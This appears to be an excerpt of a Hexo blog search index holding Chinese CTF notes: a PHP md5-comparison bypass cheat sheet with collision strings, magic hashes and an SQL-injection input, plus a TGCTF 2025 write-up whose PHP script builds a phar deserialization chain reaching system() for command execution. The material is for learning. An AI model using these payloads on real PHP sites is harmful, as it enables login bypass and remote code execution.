id="三-md5强比较"><a href="#三-md5强比较" class="headerlink" title="三.md5强比较"></a>三.md5强比较</h1><p>md5函数无法处理数组，也就是如果把a、b变成两个数组传入变量时，可以绕过md5</p><p>例如</p><p>a[]=1&amp;b[]=2</p><p>既满足a!=b，也可以绕过md5()函数</p><h1 id="四-sql之md5-password-ture"><a href="#四-sql之md5-password-ture" class="headerlink" title="四.sql之md5($password,ture)"></a>四.sql之md5($password,ture)</h1><p>输入<font style="color:rgb(243, 50, 50);">ffifdyop</font>，后端的SQL语句会变成：</p><p><em><strong><font style="color:rgb(0, 0, 0);">select * from <code>admin</code> where password=</font></strong><strong><strong><font style="color:rgb(243, 50, 50);">‘’or’6’ </font></strong></strong><strong><font style="color:rgb(0, 0, 0);"> —&gt; True</font></strong></em></p><h1 id="五-加密后弱相等-a-md5-a"><a href="#五-加密后弱相等-a-md5-a" class="headerlink" title="五.加密后弱相等$a==md5($a)"></a>五.加密后弱相等$a==md5($a)</h1><p>形式如下：</p><pre class="line-numbers language-language-python"><code class="language-language-python">if ($md5==md5($md5))<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p> 可以找0e开头并且md5后仍然0e开头的字符串。</p><p> 这里可以用0e215962017</p><h1 id="六-碰撞"><a href="#六-碰撞" class="headerlink" title="六.碰撞"></a>六.碰撞</h1><p>真实碰撞对（md5值）</p><p>eg：</p><p>0e306561559aa787d00bc6f70bbdfe3404cf03659e704f8534c00ffb659c4c8740cc942feb2da115a3f4155cbb8607497386656d7d1f34a42059d78f5a8dd1ef</p><p>和0e306561559aa787d00bc6f70bbdfe3404cf03659e744f8534c00ffb659c4c8740cc942feb2da115a3f415dcbb8607497386656d7d1f34a42059d78f5a8dd1ef</p><p>两组经过url编码后的值:</p><p><strong>#1</strong></p><p>a=M%C9h%FF%0E%E3%5C%20%95r%D4w%7Br%15%87%D3o%A7%B2%1B%DCV%B7J%3D%C0x%3E%7B%95%18%AF%BF%A2%00%A8%28K%F3n%8EKU%B3_Bu%93%D8Igm%A0%D1U%5D%83%60%FB_%07%FE%A2</p><p>b=M%C9h%FF%0E%E3%5C%20%95r%D4w%7Br%15%87%D3o%A7%B2%1B%DCV%B7J%3D%C0x%3E%7B%95%18%AF%BF%A2%02%A8%28K%F3n%8EKU%B3_Bu%93%D8Igm%A0%D1%D5%5D%83%60%FB_%07%FE%A2</p><p><strong>#2</strong></p><p>a=%4d%c9%68%ff%0e%e3%5c%20%95%72%d4%77%7b%72%15%87%d3%6f%a7%b2%1b%dc%56%b7%4a%3d%c0%78%3e%7b%95%18%af%bf%a2%00%a8%28%4b%f3%6e%8e%4b%55%b3%5f%42%75%93%d8%49%67%6d%a0%d1%55%5d%83%60%fb%5f%07%fe%a2</p><p>b=%4d%c9%68%ff%0e%e3%5c%20%95%72%d4%77%7b%72%15%87%d3%6f%a7%b2%1b%dc%56%b7%4a%3d%c0%78%3e%7b%95%18%af%bf%</p><p><strong>#3</strong></p><p>$a=”\x4d\xc9\x68\xff\x0e\xe3\x5c\x20\x95\x72\xd4\x77\x7b\x72\x15\x87\xd3\x6f\xa7\xb2\x1b\xdc\x56\xb7\x4a\x3d\xc0\x78\x3e\x7b\x95\x18\xaf\xbf\xa2\x00\xa8\x28\x4b\xf3\x6e\x8e\x4b\x55\xb3\x5f\x42\x75\x93\xd8\x49\x67\x6d\xa0\xd1\x55\x5d\x83\x60\xfb\x5f\x07\xfe\xa2”;</p><p>$b=”\x4d\xc9\x68\xff\x0e\xe3\x5c\x20\x95\x72\xd4\x77\x7b\x72\x15\x87\xd3\x6f\xa7\xb2\x1b\xdc\x56\xb7\x4a\x3d\xc0\x78\x3e\x7b\x95\x18\xaf\xbf\xa2\x02\xa8\x28\x4b\xf3\x6e\x8e\x4b\x55\xb3\x5f\x42\x75\x93\xd8\x49\x67\x6d\xa0\xd1\xd5\x5d\x83\x60\xfb\x5f\x07\xfe\xa2”;</p><h1 id="七-变量转换为字符串md5强相等绕过方法"><a href="#七-变量转换为字符串md5强相等绕过方法" class="headerlink" title="七.变量转换为字符串md5强相等绕过方法"></a>七.变量转换为字符串md5强相等绕过方法</h1><p>字符串不相等，md5的强类型相等</p><pre class="line-numbers language-language-python"><code class="language-language-python">string($a)!=string($b),md5($a)===md5($b)<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>a=M%C9h%FF%0E%E3%5C%20%95r%D4w%7Br%15%87%D3o%A7%B2%1B%DCV%B7J%3D%C0x%3E%7B%95%18%AF%BF%A2%00%A8%28K%F3n%8EKU%B3_Bu%93%D8Igm%A0%D1U%5D%83%60%FB_%07%FE%A2&amp;=&amp;b=M%C9h%FF%0E%E3%5C%20%95r%D4w%7Br%15%87%D3o%A7%B2%1B%DCV%B7J%3D%C0x%3E%7B%95%18%AF%BF%A2%02%A8%28K%F3n%8EKU%B3_Bu%93%D8Igm%A0%D1%D5%5D%83%60%FB_%07%FE%A2&amp;=</p><h1 id="八-上传的参数字符串且md5弱相等"><a href="#八-上传的参数字符串且md5弱相等" class="headerlink" title="八.上传的参数字符串且md5弱相等"></a>八.上传的参数字符串且md5弱相等</h1><pre class="line-numbers language-language-python"><code class="language-language-python">if($_POST['c1']!=$_POST['c2']&&is_string($_POST['c1'])&&is_string($_POST['c2'])&&md5($_POST['c1'])==md5($_POST['c2']))<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>科学法绕过</p><p>s878926199a</p><p>s155964671a</p><h1 id="九-NaN-和-INF"><a href="#九-NaN-和-INF" class="headerlink" title="九.NaN 和 INF"></a>九.NaN 和 INF</h1><p>NAN和INF，分别为非数字和无穷大，但是var_dump一下它们的数据类型却是double，那么在md5函数处理它们的时候，是将其直接转换为字符串”NAN”和字符串”INF”使用的，但是它们拥有特殊的性质，它们与任何数据类型（除了true）做强类型或弱类型比较均为false，甚至NAN===NAN都是false，但md5(‘NaN’)===md5(‘NaN’)为true</p><h1 id="十-HASH长度扩展攻击"><a href="#十-HASH长度扩展攻击" class="headerlink" title="十.HASH长度扩展攻击"></a>十.HASH长度扩展攻击</h1><p>前提条件</p><p>1.$a的MD5(**<u>09</u>**<strong>8f6bcd4621d373cade4e832627b4f6</strong>)</p><p>2.$a的长度=<strong>4</strong></p><p>3.$b我们可以任意控制<br>示例代码：</p><pre class="line-numbers language-language-python"><code class="language-language-python">if ($COOKIE["getmein"] === md5($secret . urldecode($username . $password))) {    echo "Congratulations! You are a registered user.\n"; die ("The flag is ". $flag); }<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>不多赘述了直接利用<strong>hashpump工具来获得payoad</strong></p>]]></content>
      
      
      <categories>
          
          <category> 归纳整理 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Web </tag>
            
            <tag> md5比较 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Hello World</title>
      <link href="/2025/04/16/hello-world/"/>
      <url>/2025/04/16/hello-world/</url>
      
        <content type="html"><![CDATA[<p>YUNiversity测试</p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>phar反序列化漏洞</title>
      <link href="/2025/04/16/phar%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/"/>
      <url>/2025/04/16/phar%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/</url>
      
        <content type="html"><![CDATA[<p>在打tgctf的时候碰到了文件上传+phar反序列化组合拳，之前有所了解但并没有掌握，趁复现好好的学习一下</p><p>先放上tg的源码</p><pre class="line-numbers language-language-php"><code class="language-language-php"><?phphighlight_file(__FILE__);error_reporting(0);function best64_decode($str){    return base64_encode(md5(base64_encode(md5($str))));    }class yesterday {    public $learn;    public $study="study";    public $try;    public function __construct()    {        $this->learn = "learn<br>";    }    public function __destruct()    {        echo "You studied hard yesterday.<br>";        return $this->study->hard();    }}class today {    public $doing;    public $did;    public $done;    public function __construct(){        $this->did = "What you did makes you outstanding.<br>";    }    public function __call($arg1, $arg2)    {        $this->done = "And what you've done has given you a choice.<br>";        echo $this->done;        if(md5(md5($this->doing))==666){            return $this->doing();        }        else{            return $this->doing->better;        }    }}class tommoraw {    public $good;    public $bad;    public $soso;    public function __invoke(){        $this->good="You'll be good tommoraw!<br>";        echo $this->good;    }    public function __get($arg1){        $this->bad="You'll be bad tommoraw!<br>";    }}class future{    private $impossible="How can you get here?<br>";    private $out;    private $no;    public $useful1;public $useful2;public $useful3;public $useful4;public $useful5;public $useful6;public $useful7;public $useful8;public $useful9;public $useful10;public $useful11;public $useful12;public $useful13;public $useful14;public $useful15;public $useful16;public $useful17;public $useful18;public $useful19;public $useful20;    public function __set($arg1, $arg2) {        if ($this->out->useful7) {            echo "Seven is my lucky number<br>";            system('whoami');        }    }    public function __toString(){        echo "This is your future.<br>";        system($_POST["wow"]);        return "win";    }    public function __destruct(){        $this->no = "no";        return $this->no;    }}if (file_exists($_GET['filename'])){    echo "Focus on the previous step!<br>";}else{    $data=substr($_GET['filename'],0,-4);    unserialize(best64($data));}// You learn yesterday, you choose today, can you get to your future??><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>比较明显的特征就是无法正常进行反序列化(不可逆的md5加密)且存在文件上传的途径（这里没有放文件上传的源码）</p><p>我们先引入phar反序列化的概念</p><blockquote><p><strong>PHAR反序列化漏洞</strong>是与PHP中的对象反序列化相关的一种安全漏洞，特别是在处理PHAR文件时可能被利用。</p><p>概念解释：</p><p>PHAR文件：</p><p>PHAR 是一种类似于ZIP或TAR的归档格式，但它专门为PHP应用程序设计。一个PHAR文件可以包含PHP文件、图片、配置等内容，可以直接在PHP环境中执行。</p><p>PHAR反序列化漏洞： PHAR文件可以存储序列化的PHP对象。在某些情况下，PHP内置函数如file_exists()、is_file()等文件操作函数可以被用于处理包含PHAR存档的路径。例如，如果一个应用程序在未预期的情况下处理到PHAR文件并通过反序列化机制读取该文件，攻击者可以构造恶意的PHAR文件，使PHP反序列化攻击得以执行。</p></blockquote><p>对于晦涩的概念我向来无感，这里直接给上一个phar包(和jar包差不多)</p><p>比较重要的就是你要新建了一个类，还有一个就是setMetadata，这是核心</p><pre class="line-numbers language-language-php"><code class="language-language-php"><?phphighlight_file(_FILE_);class Destiny{  public $he_say;}@unlink(filename:'test-phar');//删除之前的test-phar文件（如果存在)$phar=new Phar(filename:'test.phar');//创建一个Phar对象，文件名必须以phar为后缀，生成后可以随意修改$phar->startBuffering()；//开始写入文件$phar->setStub("<?php __HALT_COMPILER(); ?>"); // 写入 stub$o = new Dest1ny();//这个是链子也可以放在 @前面$phar->setMetadata($o)；//写入元数据$phar->addFromString(localName:"test.txt",contents:"test"); //添加要压缩的文件$phar->stopBuffering（）；//停止写入文件并完成压缩?><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>看我的注释就很好明白，把链子当作元数据生成phar压缩文件传入后配合phar来进行反序列化（大概的流程就是这样）</p><p>那么tg的payload也就很好写出，只需要改一下链子</p><pre class="line-numbers language-language-php"><code class="language-language-php"><?phpclass yesterday {     public $learn;     public $study;     public $try;}class today {     public $doing;}class future{     }$y = new yesterday();$y-> study = new today();$y->study->doing=new future();@unlink("phar.phar");$phar = new Phar("phar.phar"); //后缀名必须为phar，生成后可以随意修改$phar->startBuffering();$phar->setStub("<?php __HALT_COMPILER(); ?>"); //设置stub$phar->setMetadata($y); //将自定义的meta-data存入manifest$phar->addFromString("test.txt", "test"); //添加要压缩的文件 //签名自动计算$phar->stopBuffering();<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>然后直接运行，这边报错的话，需要改一下php.ini里的readonly，把ON改成OFF  </p><p><img src="/phar%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/1.png"></p><p>第一个红框是文件头，第二个红框是setMetadata，而且如果php文件里有读取文件的函数，他一定会把setMetadata里的内容反序列化。</p><p><img src="/phar%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/2.png"></p><p>更改后缀他的文件头是不变的，所以可以修改成任意的后缀（生成之后）</p>]]></content>
      
      
      <categories>
          
          <category> 序列化与反序列化 </category>
          
          <category> 文件上传 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Web </tag>
            
            <tag> phar+文件上传 </tag>
            
            <tag> tgctf2025 </tag>
            
        </tags>
      
    </entry>
    
    
  
  
</search>
